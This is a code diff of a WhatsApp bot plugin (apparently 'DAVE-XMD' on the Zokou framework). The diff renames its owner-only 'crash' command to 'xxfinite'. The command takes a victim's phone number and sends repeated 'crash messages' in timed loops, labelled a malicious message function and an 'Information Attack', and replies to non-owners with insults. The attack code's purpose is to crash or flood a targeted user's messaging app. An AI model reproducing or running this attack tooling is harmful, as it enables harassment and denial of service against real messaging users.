@@ -20,7 +20,7 @@ const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 // Malicious message function
 async function sendCrashMessage(zk, target) {
-  console.log(`[DEBUG] Sending crash message to ${target}`);
+  console.log(`[DEBUG] Sending xxfinite message to ${target}`);
 
   const venomModsData = JSON.stringify({
     status: true,
@@ -111,13 +111,13 @@ async function sendCrashMessage(zk, target) {
 }
 
 // Command: Crash
-zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, zk, commandeOptions) => {
+zokou({ nomCom: "xxfinite", categorie: "Bug", reaction: "👾" }, async (dest, zk, commandeOptions) => {
   const { ms, repondre, auteurMessage, arg } = commandeOptions;
 
-  console.log(`[DEBUG] crash triggered by ${ms.key.participant || ms.key.remoteJid} in ${dest}`);
+  console.log(`[DEBUG] xxfinite triggered by ${ms.key.participant || ms.key.remoteJid} in ${dest}`);
 
   // Handle null pushName
-  const userName = ms.pushName || "Supreme Ruler";
+  const userName = ms.pushName || "Gifted Dave";
 
   // Check if user is owner
   const normalizedAuteur = normalizeNumber(auteurMessage.split('@')[0]);
@@ -126,7 +126,7 @@ zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, 
   console.log(`[DEBUG] Owner check: isOwner=${isOwner}, normalizedAuteur=${normalizedAuteur}, normalizedOwner=${normalizedOwner}`);
 
   if (!isOwner) {
-    console.log(`[DEBUG] crash: User is not the owner`);
+    console.log(`[DEBUG] xxfinite: User is not the owner`);
     await repondre(`𝐃𝐀𝐕𝐄-𝐗𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU VILE IMPOSTOR! 😤 Trying to wield ${OWNER_NUMBER}’s destructive power? You’re LESS THAN DUST! Begone! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
     return;
   }
@@ -134,7 +134,7 @@ zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, 
   // Validate input
   if (!arg[0]) {
     console.log(`[DEBUG] crash: No target provided`);
-    await repondre(`𝐃𝐀𝐕𝐄-𝐗𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU FOOL, ${userName}! 😡 Provide a target number! Format: .crash 254xxx\n◈━━━━━━━━━━━━━━━━◈`);
+    await repondre(`𝐃𝐀𝐕𝐄-𝐗𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU FOOL, ${userName}! 😡 Provide a target number! Format: .xxfinite 254xxx\n◈━━━━━━━━━━━━━━━━◈`);
     return;
   }
 
@@ -142,19 +142,19 @@ zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, 
   let client = ms.mentionedJid[0] ? ms.mentionedJid[0] : ms.quoted ? ms.quoted.sender : arg[0];
   let clientNumber = client.includes('@s.whatsapp.net') ? client.split('@')[0] : client.replace(/[^0-9]/g, '');
   if (!isValidPhoneNumber(clientNumber)) {
-    console.log(`[DEBUG] crash: Invalid target number: ${clientNumber}`);
-    await repondre(`𝐃𝐀𝐕𝐄-𝐗𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ IDIOT, ${userName}! 😤 Invalid target number! Use: .crash 254xxx or tag/quote a user! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
+    console.log(`[DEBUG] xxfinite: Invalid target number: ${clientNumber}`);
+    await repondre(`𝐃𝐀𝐕𝐄-𝐗𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ IDIOT, ${userName}! 😤 Invalid target number! Use: .xxfinite 254xxx or tag/quote a user! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
     return;
   }
   const isTarget = client.includes('@s.whatsapp.net') ? client : `${clientNumber}@s.whatsapp.net`;
-  console.log(`[DEBUG] crash: Target set to ${isTarget}`);
+  console.log(`[DEBUG] xxfinite: Target set to ${isTarget}`);
 
   // Send processing reaction
   try {
     await zk.sendMessage(dest, { react: { text: '🔍', key: ms.key } });
-    console.log(`[DEBUG] crash: Processing reaction sent`);
+    console.log(`[DEBUG] xxfinite: Processing reaction sent`);
   } catch (e) {
-    console.log(`[DEBUG] crash: Error sending processing reaction: ${e.message}`);
+    console.log(`[DEBUG] xxfinite: Error sending processing reaction: ${e.message}`);
   }
 
   // Send crash messages
@@ -164,9 +164,9 @@ zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, 
         await sendCrashMessage(zk, isTarget);
         await sleep(5000); // 5-second delay
         await sendCrashMessage(zk, isTarget);
-        console.log(`[DEBUG] crash: Iteration ${r + 1}/5 completed`);
+        console.log(`[DEBUG] xxfinite: Iteration ${r + 1}/5 completed`);
       } catch (e) {
-        console.log(`[DEBUG] crash: Error in iteration ${r + 1}: ${e.message}`);
+        console.log(`[DEBUG] xxfinite: Error in iteration ${r + 1}: ${e.message}`);
         throw new Error(`Failed at iteration ${r + 1}: ${e.message}`);
       }
     }
@@ -174,17 +174,17 @@ zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, 
     // Send success reaction
     try {
       await zk.sendMessage(dest, { react: { text: '✅', key: ms.key } });
-      console.log(`[DEBUG] crash: Success reaction sent`);
+      console.log(`[DEBUG] xxfinite: Success reaction sent`);
     } catch (e) {
-      console.log(`[DEBUG] crash: Error sending success reaction: ${e.message}`);
+      console.log(`[DEBUG] xxfinite: Error sending success reaction: ${e.message}`);
     }
 
     // Send confirmation message
     const successMessage = `𝐃𝐀𝐕𝐄-𝐗𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ *Information Attack*\n│❒ Target: ${clientNumber}\n│❒ Status: Success\n│❒ Powered by kn_dave\n◈━━━━━━━━━━━━━━━━◈`;
     await repondre(successMessage);
-    console.log(`[DEBUG] crash: Confirmation message sent`);
+    console.log(`[DEBUG] xxfinite: Confirmation message sent`);
   } catch (e) {
-    console.log(`[DEBUG] crash: Error during attack: ${e.message}`);
+    console.log(`[DEBUG] xxfinite: Error during attack: ${e.message}`);
     await repondre(`𝐃𝐀𝐕𝐄-𝐗𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ OUTRAGEOUS, ${userName}! 😤 Attack on ${clientNumber} failed: ${e.message}! This system will PAY for its incompetence! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
   }
 });
